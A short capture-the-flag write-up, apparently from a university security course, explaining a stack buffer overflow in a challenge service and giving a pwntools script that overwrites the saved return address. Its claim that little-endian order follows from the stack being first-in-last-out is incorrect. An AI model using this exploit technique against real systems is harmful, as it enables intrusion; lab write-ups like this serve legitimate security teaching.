# Challenge `Return Address` writeup

- Vulnerability:
  - Buffer Overflow
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port `23154`
- Impact:
  - Allows attacker to control `return`s

## Steps to reproduce

1. The `return` of a function is controlled by the stored value of `eip`
2. We can overflow the buffer enough to modify the memory of this stored value, after the `gets` function
3. Since the stack is a `first-in-last-out (FILO)` structure, we need to write the bytes in `little-endian`

The code used was:

```py
from pwn import *

session = remote("mustard.stt.rnl.tecnico.ulisboa.pt", "23154", timeout=1000)
session.recvuntil('.')

eip_address = 0xffffd04c
buffer_address = 0xffffd036

session.send(b'1'* (eip_address - buffer_address) + b'\xf1\x86\x04\x08')
print(session.recvall())
```